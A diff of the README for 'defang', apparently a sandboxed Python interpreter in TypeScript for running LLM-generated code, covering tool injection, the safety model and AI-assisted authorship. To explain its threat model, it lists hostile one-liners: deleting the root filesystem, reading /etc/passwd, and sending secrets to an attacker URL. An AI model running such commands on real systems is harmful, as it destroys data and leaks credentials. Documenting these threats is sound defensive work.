@@ -1,418 +1,217 @@
-# Python Interpreter for AI-Generated Scripts
+<p align="center">
+  <img src="logo.png" alt="defang logo" width="200" />
+</p>
 
-A sandboxed Python interpreter written in TypeScript, designed for executing AI-generated code safely. The interpreter supports tool injection, allowing you to provide data-fetching functions that the AI can call.
+# defang
 
-## Quick Start
+**A sandboxed Python interpreter written in TypeScript.** Safely run Python code emitted by LLMs and agents — no filesystem access, no network access, no escape to the host process, and inject your own functions.
+
+[![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![typescript](https://img.shields.io/badge/typescript-5.x-blue.svg)](https://www.typescriptlang.org/)
+
+> **de·fang** _(verb)_ — to render harmless while keeping analyzable. In security tooling, to "defang" a payload is to strip its ability to execute dangerously while preserving its shape. This project does the same to Python.
+
+---
+
+## Why defang?
+
+LLMs love writing Python. It's the lingua franca of data work, scripting, and most agent toolchains. But handing an agent a real Python runtime is a liability:
+
+- `import os; os.system("rm -rf /")` — full shell access
+- `open("/etc/passwd").read()` — arbitrary filesystem reads
+- `import requests; requests.get(attacker_url, data=secrets)` — data exfiltration
+- `exec(user_input)` — arbitrary code execution
+
+`defang` executes Python without any of this. There is no module system, no filesystem, no network, no `exec`/`eval`, no `subprocess` — because **none of those exist in the interpreter**. You cannot disable a feature that was never implemented.
+
+The only I/O channel is **tools you explicitly inject from TypeScript**. If you don't provide a tool, the Python code cannot call it.
+
+---
+
+## Install
+
+```bash
+npm install defang
+# or
+bun add defang
+```
+
+## Quick start
 
 ```typescript
-import { runPython } from "./src";
+import { runPython } from "defang";
 
 const result = await runPython(`
-transactions = fetch_transactions("2024-01")
-total = sum([t['amount'] for t in transactions])
+total = sum([x * 2 for x in range(10) if x % 2 == 0])
 f"Total: {total}"
-`, [
-  {
-    name: "fetch_transactions",
-    description: "Fetch transactions for a given month",
-    handler: async (month: string) => {
-      return await db.transactions.findMany({ where: { month } });
-    }
-  }
-]);
+`);
 
-console.log(result); // "Total: 1234"
+console.log(result); // "Total: 40"
 ```
 
-## Architecture
+### With tool injection
 
-```
-Source Code (string)
-        │
-        ▼
-┌───────────────┐
-│    Lexer      │  → Tokens (NUMBER, STRING, IDENTIFIER, INDENT, etc.)
-└───────────────┘
-        │
-        ▼
-┌───────────────┐
-│    Parser     │  → AST (Abstract Syntax Tree)
-└───────────────┘
-        │
-        ▼
-┌───────────────┐
-│  Interpreter  │  → Result (TypeScript native value)
-└───────────────┘
-```
-
-## Supported Python Features
-
-### Data Types
-- **Numbers**: `42`, `3.14`, `1e10`
-- **Strings**: `"hello"`, `'world'`, `"""multiline"""`
-- **F-strings**: `f"Hello {name}"`, `f"Sum: {a + b}"`
-- **Booleans**: `True`, `False`
-- **None**: `None`
-- **Lists**: `[1, 2, 3]`
-- **Dicts**: `{"key": "value"}`
-- **Tuples**: `(1, 2, 3)`
-
-### Operators
-- **Arithmetic**: `+`, `-`, `*`, `/`, `//` (floor div), `%`, `**` (power)
-- **Comparison**: `==`, `!=`, `<`, `>`, `<=`, `>=`
-- **Boolean**: `and`, `or`, `not`
-- **Membership**: `in`, `not in`
-- **Augmented assignment**: `+=`, `-=`, `*=`, `/=`
-
-### Control Flow
-- `if` / `elif` / `else`
-- `for ... in ...`
-- `while`
-- `break`, `continue`, `pass`
-
-### Functions
-- Function definitions: `def foo(a, b=10):`
-- Return statements: `return value`
-- Closures supported
-- Recursion supported
-
-### Comprehensions
-- List: `[x * 2 for x in items if x > 0]`
-- Dict: `{k: v for k, v in items}`
-
-### Other
-- Ternary expressions: `a if condition else b`
-- Chained comparisons: `0 < x < 10`
-- String/list slicing: `s[1:5]`, `items[::-1]`
-- Method calls: `s.upper()`, `items.append(x)`
-
-## Built-in Functions
-
-| Function | Description |
-|----------|-------------|
-| `len(x)` | Length of string, list, dict, tuple |
-| `sum(iterable)` | Sum of numbers |
-| `range(start, stop, step)` | Generate number sequence |
-| `min(...)`, `max(...)` | Minimum/maximum value |
-| `abs(x)` | Absolute value |
-| `round(x, digits)` | Round number |
-| `sorted(iterable)` | Return sorted list |
-| `reversed(iterable)` | Return reversed iterator |
-| `enumerate(iterable)` | Return (index, value) pairs |
-| `zip(a, b, ...)` | Zip iterables together |
-| `list(x)`, `dict(x)`, `str(x)` | Type conversions |
-| `int(x)`, `float(x)`, `bool(x)` | Type conversions |
-| `any(iterable)`, `all(iterable)` | Boolean aggregation |
-| `print(...)` | Print output (captured via callback) |
-
-## String Methods
-
-`upper()`, `lower()`, `strip()`, `split()`, `join()`, `replace()`, `startswith()`, `endswith()`, `find()`, `count()`, `isdigit()`, `isalpha()`, `format()`
-
-## List Methods
-
-`append()`, `extend()`, `insert()`, `remove()`, `pop()`, `clear()`, `index()`, `count()`, `sort()`, `reverse()`, `copy()`
-
-## Dict Methods
-
-`keys()`, `values()`, `items()`, `get()`, `pop()`, `update()`, `clear()`, `copy()`, `setdefault()`
-
----
-
-## NOT Supported (By Design - Security)
-
-These features are intentionally omitted to ensure the interpreter is sandboxed:
-
-| Feature | Why Not Supported |
-|---------|-------------------|
-| `import` / `from ... import` | No module system - prevents access to `os`, `sys`, etc. |
-| `open()`, file I/O | No filesystem access |
-| `exec()`, `eval()` | No dynamic code execution |
-| `__import__`, `globals()`, `locals()` | No introspection |
-| `class` definitions | Not needed for data processing |
-| `try` / `except` | Keep it simple |
-| `async` / `await` | Not needed |
-| `yield` / generators | Not needed |
-| `*args`, `**kwargs` | Not implemented |
-| Tuple unpacking: `a, b = (1, 2)` | Not implemented |
-| Walrus operator: `:=` | Not implemented |
-| `lambda` with multiple statements | Only expression lambdas |
-
----
-
-## Tool Injection
-
-Tools are functions you provide that the Python code can call. This is how you expose your data to the AI-generated scripts.
-
-### Defining Tools
+Tools are the only way Python code can reach data outside the interpreter:
 
 ```typescript
-import { createInterpreter, ToolDefinition } from "./src";
+import { runPython } from "defang";
 
-const tools: ToolDefinition[] = [
-  {
-    name: "fetch_transactions",
-    description: "Fetch bank transactions for a date range",
-    handler: async (startMonth: string, endMonth: string) => {
-      // Your actual implementation
-      return await db.transactions.findMany({
-        where: { date: { gte: startMonth, lte: endMonth } }
-      });
-    }
-  },
-  {
-    name: "get_customer",
-    description: "Get customer by ID", 
-    handler: (customerId: number) => {
-      return db.customers.findById(customerId);
-    }
-  }
-];
-
-const interpreter = createInterpreter({ tools });
-const result = await interpreter.run(pythonCode);
-```
-
-### Tool Parameters
-
-Parameters are passed positionally from Python to your handler:
-
-```python
-# Python code
-result = fetch_transactions("2024-01", "2024-03")
-```
-
-```typescript
-// Handler receives
-handler: (startMonth, endMonth) => { ... }
-// startMonth = "2024-01", endMonth = "2024-03"
-```
-
-### Async Handlers
-
-Handlers can be async - the interpreter will await them:
-
-```typescript
-handler: async (id: number) => {
-  const data = await fetch(`/api/data/${id}`);
-  return await data.json();
-}
-```
-
----
-
-## Security Considerations
-
-### What's Safe ✅
-
-- **No filesystem access** - `open()` doesn't exist
-- **No network access** - No `requests`, `urllib`, `fetch`
-- **No code injection** - No `exec()`, `eval()`, `__import__`
-- **No system access** - No `os`, `sys`, `subprocess`
-- **Iteration limits** - Prevents infinite loops (default: 100,000)
-
-### Potential Risks ⚠️
-
-1. **Memory exhaustion** - Large lists/strings not limited
-   ```python
-   x = [0] * 100000000  # Could use lots of memory
-   ```
-
-2. **Tool handler abuse** - Your handlers receive user-controlled input
-   ```typescript
-   // DANGEROUS - SQL injection possible!
-   handler: (query) => db.rawQuery(query)
-   
-   // SAFE - parameterized query
-   handler: (id) => db.query("SELECT * FROM users WHERE id = ?", [id])
-   ```
-
-3. **CPU exhaustion** - Complex operations within iteration limit
-   ```python
-   x = "a" * 10000000  # 10MB string - slow but allowed
-   ```
-
-### Recommendations
-
-1. **Lower iteration limit for untrusted input:**
-   ```typescript
-   createInterpreter({ maxIterations: 10_000 })
-   ```
-
-2. **Validate tool parameters:**
-   ```typescript
-   handler: (month: string) => {
-     if (!/^\d{4}-\d{2}$/.test(month)) {
-       throw new Error("Invalid month format");
-     }
-     return db.query(...);
-   }
-   ```
-
-3. **Never pass user input directly to:**
-   - SQL queries (use parameterized queries)
-   - Shell commands
-   - File paths
-   - eval/Function constructors
-
----
-
-## API Reference
-
-### `runPython(code, tools?, onPrint?)`
-
-Quick execution function.
-
-```typescript
 const result = await runPython(
-  'sum([1, 2, 3])',           // Python code
-  [],                          // Tools (optional)
-  (msg) => console.log(msg)    // Print callback (optional)
+  `
+transactions = fetch_transactions("2026-04")
+total = sum([t['amount'] for t in transactions if t['amount'] > 0])
+f"Inflow: {total}"
+  `,
+  [
+    {
+      name: "fetch_transactions",
+      description: "Fetch transactions for a given month (YYYY-MM).",
+      handler: async (month: string) => {
+        return await db.transactions.findMany({ where: { month } });
+      },
+    },
+  ],
 );
 ```
 
-### `createInterpreter(options)`
+Handlers can be synchronous or async. The interpreter awaits async handlers automatically.
 
-Create a reusable interpreter instance.
+### Reusable interpreter
 
 ```typescript
+import { createInterpreter } from "defang";
+
 const interpreter = createInterpreter({
-  tools: [...],              // Tool definitions
-  onPrint: (msg) => { },     // Print callback
-  maxIterations: 100_000,    // Loop iteration limit
+  tools: [...],
+  onPrint: (msg) => logger.info(msg),
+  maxIterations: 10_000, // lower for untrusted input
 });
 
-const result = await interpreter.run(code);
+const a = await interpreter.run(codeOne);
+const b = await interpreter.run(codeTwo);
+```
+
+---
+
+## What's supported
+
+A quick overview — see [`FEATURES.md`](./FEATURES.md) for the authoritative list with TypeScript analogues for every feature.
+
+**Works:** numbers, strings, f-strings, booleans, `None`, lists, tuples, dicts, sets, comprehensions (list, dict), `if`/`elif`/`else`, `for`/`while` (with `else` clauses), `break`/`continue`/`pass`, `try`/`except`/`finally`, `raise`, function definitions with `*args`/`**kwargs` and defaults, closures, lambdas, chained assignment (`x = y = 5`), chained comparisons (`0 < x < 10`), slicing, `and`/`or`/`not`, ternary expressions, walrus (`:=`), most string/list/dict methods, and ~30 built-ins (`len`, `range`, `sum`, `sorted`, `enumerate`, `zip`, `map`, `filter`, `any`, `all`, `print`, etc.).
+
+**Intentionally absent (for safety):** `import`, `open`, `exec`, `eval`, `__import__`, `globals`, `locals`, `compile`, filesystem I/O, network, subprocess, classes, decorators, generators, `async`/`await`.
+
+**Known gaps (will be fixed):** tuple unpacking at statement level, `lstrip`/`rstrip`/`ljust`/`rjust`, set-literal comprehensions, f-string format specs, and a handful of built-ins. See `FEATURES.md`.
+
+---
+
+## Safety model
+
+`defang` is safe by _construction_, not by _configuration_. The dangerous Python features simply do not exist in this interpreter — there is no flag to enable them and no module to import them from.
+
+| Attack surface         | Status                                                   |
+| ---------------------- | -------------------------------------------------------- |
+| Filesystem access      | Absent (`open` is not defined)                           |
+| Network access         | Absent (no `urllib`, `requests`, `socket`)               |
+| Shell / subprocess     | Absent (no `os`, `subprocess`)                           |
+| Dynamic code execution | Absent (no `exec`, `eval`, `compile`, `__import__`)      |
+| Module imports         | Absent (no module system)                                |
+| Introspection escape   | Absent (no `globals()`, `locals()`, `__dict__`)          |
+| Infinite loops / DoS   | Bounded by `maxIterations` (default 100,000)             |
+| Host memory exhaustion | **Not bounded** — validate tool inputs (see below)       |
+| Host CPU exhaustion    | **Bounded loosely** via iteration limit — not wall-clock |
+
+### Residual risks (yours to own)
+
+1. **Tool handlers are trust boundaries.** Whatever a tool handler does with its arguments is on you. If a tool runs SQL, parameterize it. If a tool calls out to a system, validate inputs.
+2. **Memory.** `[0] * 10_000_000` is legal Python and `defang` will happily allocate it. Put a memory budget on your Node/Bun process if you're running untrusted input.
+3. **Wall-clock.** Iteration-counting prevents infinite loops but does not cap wall-clock time. Run untrusted code in a worker with a timeout.
+
+---
+
+## API
+
+### `runPython(code, tools?, onPrint?)`
+
+One-shot execution. Returns the value of the last expression, or `None` if the code ends in a statement.
+
+### `createInterpreter(options)`
+
+Long-lived interpreter. Options:
+
+- `tools: ToolDefinition[]` — functions callable from Python
+- `onPrint: (msg: string) => void` — called for every `print()` invocation
+- `maxIterations: number` — loop iteration budget (default 100,000)
+
+### `ToolDefinition`
+
+```typescript
+interface ToolDefinition {
+  name: string;
+  description?: string;
+  handler: (...args: any[]) => any | Promise<any>;
+}
 ```
 
 ### `generateToolsPrompt(tools)`
 
-Generate a system prompt for Claude describing available tools.
-
-```typescript
-const prompt = generateToolsPrompt(tools);
-// Returns:
-// "You have access to the following tools through Python code:
-//  - fetch_transactions() - Fetch bank transactions
-//  - get_customer() - Get customer by ID
-//  ..."
-```
+Produces a system-prompt fragment describing available tools, for use with Claude / other LLMs.
 
 ---
 
-## File Structure
+## Architecture
 
 ```
-parser/
-├── src/
-│   ├── index.ts        # Main entry point, exports
-│   ├── tokens.ts       # Token type definitions
-│   ├── lexer.ts        # Tokenizer (source → tokens)
-│   ├── ast.ts          # AST node type definitions
-│   ├── parser.ts       # Parser (tokens → AST)
-│   ├── values.ts       # Runtime value types
-│   ├── builtins.ts     # Built-in functions
-│   ├── interpreter.ts  # Evaluator (AST → result)
-│   └── errors.ts       # Error types
-└── tests/
-    ├── lexer.test.ts
-    ├── parser.test.ts
-    ├── interpreter.test.ts
-    └── tools.test.ts
+source code ──► lexer ──► tokens ──► parser ──► AST ──► interpreter ──► value
+                                                              │
+                                                              └─► tool handler (TS)
 ```
 
-## Running Tests
+- `src/lexer.ts` — tokenizer, including INDENT/DEDENT tracking
+- `src/parser.ts` — recursive-descent parser producing the AST
+- `src/ast.ts` — AST node types
+- `src/interpreter.ts` — tree-walking evaluator
+- `src/builtins.ts` — built-in functions and string/list/dict methods
+- `src/values.ts` — runtime value types
+- `src/errors.ts` — Python-like exception types
+
+---
+
+## Development
 
 ```bash
-bun test parser/tests
+bun install             # install devDependencies
+bun test                # run the full suite
+bun run test:features   # run the behavioral feature suite
+bun run typecheck       # tsc --noEmit
+bun run build           # emit dist/
 ```
+
+Contributions welcome. Two rules:
+
+1. **Never add a capability that widens the safety boundary.** No module system, no `exec`, no filesystem, no network. If you want to expose something to Python code, add it as a tool, not as a built-in.
+2. **Match CPython behavior.** When in doubt, open a real Python REPL and observe. The test suite is the spec.
 
 ---
 
-## Example: Financial Data Analysis
+## A note on AI-assisted authorship
 
-```typescript
-import { createInterpreter } from "./src";
+A substantial portion of this codebase was written with the help of Claude. I'm flagging it up front because transparency matters and because I want to explain why I think this is a reasonable approach here — not a general endorsement, but a case for _this specific kind of project_.
 
-const interpreter = createInterpreter({
-  tools: [
-    {
-      name: "list_transactions",
-      handler: () => mockTransactions,
-    },
-    {
-      name: "list_invoices", 
-      handler: () => mockInvoices,
-    }
-  ]
-});
+**A Python interpreter is a black box with a very well-defined contract.** The contract is "behave like CPython for the supported subset." That contract is:
 
-const result = await interpreter.run(`
-transactions = list_transactions()
-invoices = list_invoices()
+- **Externally specified.** Python's semantics are documented, tested, and can be verified against a reference implementation that ships with every major OS. If `defang` says `int(-3.9) == -3`, I can check that in a real Python REPL in five seconds.
+- **Mechanically testable.** Every behavioral claim is a unit test. Given input X, produce output Y. There is very little room for "it works but it's subtly wrong" in a way that tests wouldn't catch — and when there is, the right fix is to add a test, not to re-audit the code by hand.
+- **Narrowly scoped.** The code does one thing: interpret a stream of Python tokens and produce values. It does not make network calls, write to disk, or interact with shared state. The blast radius of a bug is "the code returns the wrong answer," not "the code leaks user data."
 
-# Group transactions by month
-monthly = {}
-for t in transactions:
-    month = t['date'][:7]
-    if month not in monthly:
-        monthly[month] = 0
-    monthly[month] += t['amount']
+For projects like this — interpreters, parsers, codecs, protocol implementations, math libraries, anything with a reference spec and deterministic I/O — I believe the honest engineering question is not "who typed this?" but "is the behavior correct, and can you prove it?" The test suite is the proof. If `bun test` passes and the coverage is honest, the implementation is sound whether a human, an AI, or a team of both produced it.
 
-# Calculate totals
-total_transactions = sum([t['amount'] for t in transactions])
-total_invoiced = sum([i['amount'] for i in invoices])
+I would not make the same argument about a project where the spec _is_ the code itself — a novel system design, a security-critical protocol, a piece of infrastructure where the blast radius extends beyond its return value. Those warrant human review line by line. `defang` is not that project.
 
-{
-    'monthly_breakdown': monthly,
-    'total_transactions': total_transactions,
-    'total_invoiced': total_invoiced,
-    'difference': total_transactions - total_invoiced
-}
-`);
-
-console.log(result);
-// {
-//   monthly_breakdown: { '2024-01': 500, '2024-02': 750 },
-//   total_transactions: 1250,
-//   total_invoiced: 1100,
-//   difference: 150
-// }
-```
+If you find a case where `defang` diverges from CPython, please [file an issue](https://github.com/ianjaku/defang/issues) with a minimal repro. That's the contract.
 
 ---
 
-## Common Gotchas
+## License
 
-1. **Leading whitespace in template literals** - The interpreter auto-trims, but be aware:
-   ```typescript
-   // This works (auto-trimmed)
-   runPython(`
-   x = 1
-   `)
-   ```
-
-2. **Tool names with `()`** - Automatically stripped:
-   ```typescript
-   // Both work the same
-   { name: "my_func" }
-   { name: "my_func()" }  // () is stripped
-   ```
-
-3. **F-strings require expressions** - Empty `{}` is invalid:
-   ```python
-   f"Hello {}"  # Error
-   f"Hello {name}"  # OK
-   ```
-
-4. **No tuple unpacking**:
-   ```python
-   # NOT supported
-   a, b = (1, 2)
-   
-   # Use instead
-   t = (1, 2)
-   a = t[0]
-   b = t[1]
-   ```
-
+MIT © Ian Jakubek — see [LICENSE](LICENSE).
